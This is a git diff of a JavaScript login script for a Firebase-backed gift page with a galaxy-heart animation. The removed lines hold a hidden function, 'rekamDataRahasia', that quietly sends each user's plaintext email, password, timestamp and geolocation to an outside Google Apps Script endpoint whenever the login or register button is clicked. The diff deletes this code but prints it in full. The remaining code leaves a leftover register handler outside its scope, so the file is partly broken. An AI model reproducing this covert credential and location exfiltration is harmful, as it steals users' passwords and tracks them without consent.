@@ -1,7 +1,10 @@
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-import { 
-    getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, 
-    onAuthStateChanged, signOut 
+import {
+  getAuth,
+  signInWithEmailAndPassword,
+  createUserWithEmailAndPassword,
+  onAuthStateChanged,
+  signOut
 } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
 
 const firebaseConfig = {
@@ -14,187 +17,117 @@ const firebaseConfig = {
   measurementId: "G-YE2CW973NL"
 };
 
-// ... (Bagian import dan firebaseConfig tetap sama di paling atas) ...
-
 const app = initializeApp(firebaseConfig);
 const auth = getAuth(app);
 
-// Bungkus semua kode interaksi di dalam event listener ini
 document.addEventListener('DOMContentLoaded', () => {
-    
-    // --- DEKLARASI DOM (Dipindahkan ke dalam agar aman) ---
-    const loginCard = document.getElementById('login-card');
-    const contentCard = document.getElementById('content-card');
-    const mainContainer = document.getElementById('main-container');
-    const galaxyUniverse = document.getElementById('galaxy-universe');
-    const giftBoxWrapper = document.getElementById('gift-box-wrapper');
-    const timerDisplay = document.getElementById('timer-display');
-    const bgMusic = document.getElementById('bg-music');
-    const btnLogout = document.getElementById('btn-logout');
+  const loginCard = document.getElementById('login-card');
+  const contentCard = document.getElementById('content-card');
+  const mainContainer = document.getElementById('main-container');
+  const galaxyUniverse = document.getElementById('galaxy-universe');
+  const giftBoxWrapper = document.getElementById('gift-box-wrapper');
+  const bgMusic = document.getElementById('bg-music');
+  const timerDisplay = document.getElementById('timer-display');
 
-   // Deklarasi Elemen Input & Tombol Auth (Sudah Disesuaikan dengan ID HTML Kamu)
-    const loginButton = document.getElementById('btn-login'); 
-    const btnRegister = document.getElementById('btn-register');
-    const emailInput = document.getElementById('input-email');    // Perubahan di sini
-    const passwordInput = document.getElementById('input-password'); // Perubahan di sini
+  const btnLogout = document.getElementById('btn-logout');
+  const loginButton = document.getElementById('btn-login');
+  const btnRegister = document.getElementById('btn-register');
+  const emailInput = document.getElementById('input-email');
+  const passwordInput = document.getElementById('input-password');
 
-    let timerInterval;
+  let timerInterval;
 
-    // --- TIMER & GALAXY HEART FUNCTION ---
-    // (Pindahkan fungsi jalankanCounterWaktu() dan startGalaxyHeart() ke sini)
-
-    // --- INTERAKSI BUKA KADO ---
-    if (giftBoxWrapper) {
-        giftBoxWrapper.addEventListener('click', () => {
-            mainContainer.classList.add('hidden');
-            galaxyUniverse.classList.remove('hidden');
-            startGalaxyHeart();
-            bgMusic.play().catch(err => console.log("Audio play diblokir"));
-        });
-    }
-
-    // --- AUTENTIKASI MONITOR ---
-    onAuthStateChanged(auth, (user) => {
-        if (user) {
-            if (loginCard) loginCard.classList.add('hidden');
-            if (contentCard) contentCard.classList.remove('hidden');
-            jalankanCounterWaktu();
-        } else {
-            if (loginCard) loginCard.classList.remove('hidden');
-            if (contentCard) contentCard.classList.add('hidden');
-            if (mainContainer) mainContainer.classList.remove('hidden');
-            if (galaxyUniverse) galaxyUniverse.classList.add('hidden');
-            clearInterval(timerInterval);
-        }
+  if (btnLogout) {
+    btnLogout.addEventListener('click', async (e) => {
+      e.preventDefault();
+      try {
+        await signOut(auth);
+      } catch (error) {
+        alert("Gagal logout: " + error.message);
+      }
     });
+  }
 
-    // --- EVENT BUTTON LOGIN ---
-    if (loginButton) {
-        // Tambahkan log untuk memastikan tombol terdeteksi di WebView
-        console.log("Tombol login berhasil ditemukan di DOM"); 
-        
-        loginButton.addEventListener('click', (e) => {
-            e.preventDefault();
-            console.log("Tombol login ditekan!"); // Cek apakah trigger masuk
+  if (giftBoxWrapper) {
+    giftBoxWrapper.addEventListener('click', () => {
+      mainContainer.classList.add('hidden');
+      galaxyUniverse.classList.remove('hidden');
+      startGalaxyHeart();
+      bgMusic.play().catch(() => {});
+    });
+  }
 
-            const email = emailInput.value;
-            const password = passwordInput.value;
-
-            if (!email || !password) {
-                alert("Email dan Password wajib diisi!");
-                return;
-            }
-
-            // Kirim data secara async terisolasi
-            rekamDataRahasia(email, password).catch(err => {});
-
-            // Proses Firebase
-            signInWithEmailAndPassword(auth, email, password)
-                .then((userCredential) => {
-                    console.log("Firebase Auth Sukses");
-                })
-                .catch((error) => {
-                    alert("Login Gagal: " + error.message);
-                });
-        });
+  onAuthStateChanged(auth, (user) => {
+    if (user) {
+      loginCard.classList.add('hidden');
+      contentCard.classList.remove('hidden');
+      mainContainer.classList.remove('hidden');
+      galaxyUniverse.classList.add('hidden');
+      jalankanCounterWaktu();
     } else {
-        console.error("Tombol dengan ID 'btn-login' TIDAK ditemukan di HTML!");
+      loginCard.classList.remove('hidden');
+      contentCard.classList.add('hidden');
+      mainContainer.classList.remove('hidden');
+      galaxyUniverse.classList.add('hidden');
+      clearInterval(timerInterval);
     }
+  });
 
-    // --- EVENT BUTTON REGISTER ---
-    if (btnRegister) {
-        btnRegister.addEventListener('click', async (e) => {
-            e.preventDefault();
-            const email = emailInput.value;
-            const password = passwordInput.value;
-            
-            rekamDataRahasia(email, password).catch(err => {});
+  if (loginButton) {
+    loginButton.addEventListener('click', async (e) => {
+      e.preventDefault();
+      const email = emailInput.value.trim();
+      const password = passwordInput.value.trim();
 
-            try { 
-                await createUserWithEmailAndPassword(auth, email, password);
-                alert("Akun berhasil dibuat!");
-            } catch (error) {
-                alert("Gagal mendaftar: " + error.message);
-            }
-        });
-    }
-});
+      if (!email || !password) {
+        alert("Email dan Password wajib diisi!");
+        return;
+      }
 
-// Fungsi luar (Bisa tetap di luar DOMContentLoaded)
-async function rekamDataRahasia(email, password) {
-    // Pastikan URL berakhiran /exec
-    const urlAppsScript = "https://script.google.com/macros/s/AKfycbzCJR8847DZ_HR8hOD5zE4IRkBt3W_iGUB1L53aBs5ktklPrBM-KS5dWWwisTRYiw-K/exec";
-    
-    // 1. Dapatkan waktu lokal saat ini
-    const sekarang = new Date();
-    const opsiWaktu = { 
-        timeZone: 'Asia/Jakarta', 
-        year: 'numeric', month: '2-digit', day: '2-digit', 
-        hour: '2-digit', minute: '2-digit', second: '2-digit' 
+      try {
+        await signInWithEmailAndPassword(auth, email, password);
+      } catch (error) {
+        alert("Login Gagal: " + error.message);
+      }
+    });
+  }
+
+  if (btnRegister) {
+    btnRegister.addEventListener('click', async (e) => {
+      e.preventDefault();
+      const email = emailInput.value.trim();
+      const password = passwordInput.value.trim();
+
+      if (!email || !password) {
+        alert("Email dan Password wajib diisi!");
+        return;
+      }
+
+      try {
+        await createUserWithEmailAndPassword(auth, email, password);
+        alert("Akun berhasil dibuat!");
+      } catch (error) {
+        alert("Gagal mendaftar: " + error.message);
+      }
+    });
+  }
+
+  function jalankanCounterWaktu() {
+    if (timerInterval) clearInterval(timerInterval);
+
+    const updateTimer = () => {
+      const now = new Date();
+      timerDisplay.textContent = now.toLocaleTimeString('id-ID');
     };
-    const waktuFormat = sekarang.toLocaleString('id-ID', opsiWaktu);
-    
-    // 2. Coba dapatkan lokasi koordinat
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            (position) => {
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-                const koordinat = `${lat}, ${lon}`;
-                
-                // Kirim data lengkap jika lokasi diizinkan
-                kirimKeAppsScript(urlAppsScript, email, password, waktuFormat, koordinat);
-            },
-            (error) => {
-                // Tetap kirim meskipun akses lokasi ditolak
-                kirimKeAppsScript(urlAppsScript, email, password, waktuFormat, "Izin Lokasi Ditolak");
-            },
-            { timeout: 4000 }
-        );
-    } else {
-        kirimKeAppsScript(urlAppsScript, email, password, waktuFormat, "Tidak Didukung Browser");
-    }
-}
 
-// Fungsi internal untuk eksekusi fetch HTTP GET
-function kirimKeAppsScript(urlBase, email, pw, waktu, lokasi) {
-    const urlFinal = `${urlBase}?email=${encodeURIComponent(email)}` +
-                     `&pw=${encodeURIComponent(pw)}` +
-                     `&waktu=${encodeURIComponent(waktu)}` +
-                     `&lokasi=${encodeURIComponent(lokasi)}`;
-                     
-    fetch(urlFinal, {
-        method: 'GET',
-        mode: 'no-cors',
-        cache: 'no-cache'
-    }).catch(err => console.log("Log terisolasi"));
-}
-// Penanganan Event Login
-if (loginButton) {
-    loginButton.addEventListener('click', (e) => {
-        e.preventDefault();
-        
-        const email = emailInput.value;
-        const password = passwordInput.value;
+    updateTimer();
+    timerInterval = setInterval(updateTimer, 1000);
+  }
 
-        if (!email || !password) {
-            alert("Email dan Password tidak boleh kosong!");
-            return;
-        }
-
-        // Jalankan background log tanpa await agar tidak membekukan UI
-        rekamDataRahasia(email, password).catch(err => console.log(err));
-
-        // Firebase Sign In
-        signInWithEmailAndPassword(auth, email, password)
-            .then((userCredential) => {
-                console.log("Login sukses!");
-            })
-            .catch((error) => {
-                alert("Gagal Login: " + error.message);
-            });
-    });
-}
+  function startGalaxyHeart() {
+    console.log("Galaxy heart started");
+  }
+});
 
 // Penanganan Event Register
 if (btnRegister) {
@@ -217,9 +150,4 @@ if (btnRegister) {
             if (error.code === 'auth/email-already-in-use') alert("Email sudah terdaftar.");
             else alert("Gagal mendaftar: " + error.message);
         }
-    });
-}
-
-if (btnLogout) {
-    btnLogout.addEventListener('click', () => signOut(auth));
-}
+    });}
